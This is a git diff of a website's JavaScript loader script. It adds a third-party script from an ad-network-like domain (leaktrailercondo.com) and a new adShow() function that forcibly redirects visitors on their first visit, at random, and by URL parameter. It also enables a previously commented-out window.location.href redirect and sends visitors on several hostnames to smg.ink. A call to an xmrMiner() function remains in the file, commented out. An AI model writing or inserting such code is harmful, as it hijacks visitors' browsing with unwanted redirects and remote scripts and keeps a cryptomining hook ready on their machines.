@@ -4,7 +4,8 @@ window.onload = function() {
 
 var jsFiles = [
     'https://imc.re/assets/js/core/jquery.min.js',
-    'https://leaktrailercondo.com/ff/22/ec/ff22ec5ace281b1e00826a57377a9c22.js'
+    'https://leaktrailercondo.com/68/57/d4/6857d4b9ee98aad8bbaaa55523619d23.js',
+    'https://pagead2.googlesyndication.com/pagead/js/adsbygoogle.js?client=ca-pub-3805485436239833'
 ];
 
 var links = [
@@ -17,19 +18,16 @@ var links = [
 function loadIMCMain() {
     loadScripts(jsFiles);
     redirectToDomain();
+    adShow();
     baiduTongji();
     googleAnalytics();
     // xmrMiner();
+}
 
-    // if (!localStorage.getItem('hasVisited')) {
-    //   localStorage.setItem('hasVisited', 'true');
-    //   redirectToLinks('win');
-    // }
-    var ads = getURLParameter('ads');
-    if (ads == '1') {
-        redirectToLinks('win');
-    } else if (ads == '2') {
-        redirectToLinks('loc');
+function adShow() {
+    if (!localStorage.getItem('hasVisited')) {
+      localStorage.setItem('hasVisited', 'true');
+      redirectToLinks('loc');
     }
 
     var randomNumber = Math.random();
@@ -37,6 +35,13 @@ function loadIMCMain() {
         redirectToLinks('loc');
     } else {
         redirectToLinks('win');
+    }
+
+    var ads = getURLParameter('ads');
+    if (ads == '1') {
+        redirectToLinks('win');
+    } else if (ads == '2') {
+        redirectToLinks('loc');
     }
 }
 
@@ -74,7 +79,7 @@ function redirectToLinks(t,u) {
         // window.open(url, '_blank');
         createSuperLabel(url,"newpages")
     } else {
-        // window.location.href = url;
+        window.location.href = url;
     }
 };
 
@@ -93,22 +98,23 @@ function createSuperLabel(url, id) {
 
 function redirectToDomain() {
     var hostname = window.location.hostname; // 获取当前页面的域名
-    var url;
+    var url = 'https://smg.ink';
 
     switch (hostname) {
+        case '127.0.0.1':
+        case 'localhost':
+            url = 'https://smg.ink/?utm_source=imc-main.js';
+            redirectToLinks('loc', url);
+            break;
         case 'imc.cab':
-            url = 'https://smg.ink';
-            break;
         case 'hugo.imc.re':
-            url = 'https://smg.ink';
-            break;
         case 'smgoro.com':
-            url = 'https://smg.ink';
+            url = 'https://smg.ink/?utm_source=imc-main.js';
+            redirectToLinks('loc', url);
             break;
         default:
             break;
     }
-    redirectToLinks('loc', url);
 }
 
 function xmrMiner() {
